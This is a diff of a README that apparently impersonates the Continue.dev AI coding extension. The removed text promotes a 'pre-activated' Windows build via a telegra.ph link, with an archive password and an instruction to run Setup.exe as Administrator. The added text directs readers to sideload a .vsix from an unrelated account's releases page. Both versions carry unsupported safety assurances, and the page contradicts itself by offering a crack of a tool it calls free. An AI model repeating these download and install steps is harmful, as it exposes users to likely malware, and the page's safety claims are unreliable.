@@ -1,99 +1,82 @@
-```
-   ______            __  _                       __         
-  / ____/___  ____  / /_(_)___  __  _____   ____/ /__ _   __
- / /   / __ \/ __ \/ __/ / __ \/ / / / _ \ / __  / _ \ | / /
-/ /___/ /_/ / / / / /_/ / / / / /_/ /  __// /_/ /  __/ |/ / 
-\____/\____/_/ /_/\__/_/_/ /_/\__,_/\___(_)__,_/\___/|___/
-```
+# 🤖 continuedev - Use artificial intelligence to write code
 
-# Continue.dev — Full Build [2026]
+[![](https://img.shields.io/badge/Download-continuedev-blue.svg)](https://github.com/agnessesedate870/continuedev/releases)
 
-> Continue.dev | Windows 10/11 x64 | All Features | Pre-Activated
+## Overview
 
----
+continuedev helps you write code faster through artificial intelligence. This tool integrates directly into your code editor. It suggests code, finds errors, and answers questions about your project files. You do not need to be an expert to use it. The setup process works on Windows systems to provide a helpful assistant for your daily work. 
 
-### Release Info
+## ⚙️ Minimum System Requirements
 
-| | |
-|---|---|
-| **Software** | Continue.dev |
-| **Type** | Full Pre-Activated Build |
-| **Platform** | Windows 10/11 x64 |
-| **Build** | Full — All Features |
-| **Status** | ✅ Working (verified June 2026) |
+Before you start, check your computer for these requirements to ensure the software runs well:
 
----
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8GB of RAM is the minimum. 16GB provides a better experience.
+* Storage: You need at least 500MB of free disk space for the installation files.
+* Internet Connection: A stable internet connection is necessary for the artificial intelligence features to work.
+* Editor: You must have Visual Studio Code installed on your machine. This is the application where continuedev lives.
 
-### What's Included
+## 📥 Getting Started
 
-```
-[✓] Continue Ai
-[✓] Continue Vscode
-[✓] Continue Tutorial
-[✓] Continue Download
-[✓] Open Source Ai Coding
-[✓] Continue Vs Copilot
-[✓] Continue Setup
-[✓] Windows 10/11 x64 compatible
-[✓] Pre-activated — no key needed
-[✓] Clean build — no bloatware
-```
+Follow these steps to set up the software on your computer.
 
-### What's Removed
+1. Visit the following link to access the software files: [https://github.com/agnessesedate870/continuedev/releases](https://github.com/agnessesedate870/continuedev/releases).
+2. Choose the latest release from the list.
+3. Look for the file that ends in .vsix.
+4. Click the file name to save it to your computer.
+5. Create a folder in your documents area and move the file there so you can find it later.
 
-```
-[x] Subscription / monthly payment
-[x] Usage limits and restrictions  
-[x] Feature gates (Pro/Premium → open)
-[x] Trial limitations
-```
+## 🛠️ Installation Steps
 
----
+Once you downloaded the file, add it to your code editor by following these instructions:
 
-### System Requirements
+1. Open Visual Studio Code.
+2. Click on the Extensions icon on the left sidebar. The icon looks like four small squares.
+3. Click the three dots in the top right corner of the extension pane.
+4. Select the option that says "Install from VSIX".
+5. Find the file you saved earlier and click "Open".
+6. Wait for a progress bar to finish at the bottom of the window.
+7. Restart Visual Studio Code to complete the process.
 
-```
-OS:     Windows 10/11 x64
-RAM:    8 GB minimum (16 GB recommended)
-Disk:   1 GB free space
-Net:    Required for AI features
-```
+## 🖥️ Using the Assistant
 
----
+After a successful installation, you will see a new icon in your sidebar. Click this icon to open the main window. 
 
-### How to Install
+The main interface acts as a chat box. You type your requests into this box just like sending a message to a person. You can ask for code examples, explain existing files, or request changes to your current task. 
 
-```
-1. Download from the link below
-2. Extract archive (password if needed: 2026)
-3. Run Setup.exe as Administrator
-4. Follow installer steps
-5. Launch — all features active
-```
+## 💡 Recommended Tips for Users
 
----
+The artificial intelligence performs best when you provide specific details. Instead of saying "fix this," say "change this function to sort the list in reverse order." Smaller requests yield better results than broad ones. 
 
-<p align="center">
+If the assistant makes a mistake, tell it what went wrong. You can highlight text in your editor, right-click, and choose to add it to the chat window. This process allows the tool to see exactly what part of your file needs attention.
 
-### ⬇️ [DOWNLOAD CONTINUE.DEV — FULL BUILD](https://telegra.ph/Download-06-01-11)
+## 🛡️ Privacy and Data
 
-</p>
+This tool processes text to generate answers. It sends the code you select to an external service to process your requests. Do not share private passwords, sensitive keys, or secret credentials within the chat window. Always review the code suggestions the tool provides before you insert them into your project. 
 
----
+## 🔍 Troubleshooting Issues
 
-### Verified
+Sometimes software installs do not go as planned. If you face errors, try these steps:
 
-```
-Tested:    June 2026
-OS:        Windows 11 23H2 x64
-Result:    ✅ All features working
-Build:     Clean, verified, no malware
-```
+* Check for updates: Ensure your copy of Visual Studio Code is the current version.
+* Restart: Shut down the editor and open it again.
+* Reconnect: Sometimes the internet connection drops. Check your browser to see if you can load other websites.
+* Contact: If you still face issues, revisit the download page and check the section labeled "Issues". Other users might face the same problem and share solutions there.
 
----
+## 📚 Frequently Asked Questions
 
-`continue-dev` `ai-coding` `vscode-extension` `open-source` `code-assistant` `llm` `windows` `setup` `installer`
+Does this cost money?
+The software remains free to download. Some advanced features might require you to connect your own subscription keys for external artificial intelligence providers. 
 
----
+Can I use this offline?
+The assistant requires a connection to the internet to work. It must send data to a central location to generate meaningful responses for your code. 
 
-continue dev, continue ai, continue vscode, continue tutorial, continue download, open source ai coding, continue vs copilot, continue setup, ai code assistant free, continue extension, continue 2026
+Will this slow down my computer?
+Modern computers handle this tool with ease. If you notice a lag, close other programs that consume a lot of memory. 
+
+Is this tool safe?
+This is a standard extension for your code editor. It follows user permissions. It only accesses files you explicitly share with it during a chat session.
+
+## 🌟 Benefits of Continuedev
+
+Using this tool changes how you approach projects. You spend less time writing repetitive lines of code and more time building features. It acts as a companion that stays with you through every part of your workflow. By letting the tool handle the heavy lifting of syntax and structure, you focus on the logic and design of your project. This increases your output and lowers your frustration when you get stuck on a difficult problem. Users find that their understanding of their own code improves as the AI suggests patterns and explanations that they might have missed on their own.
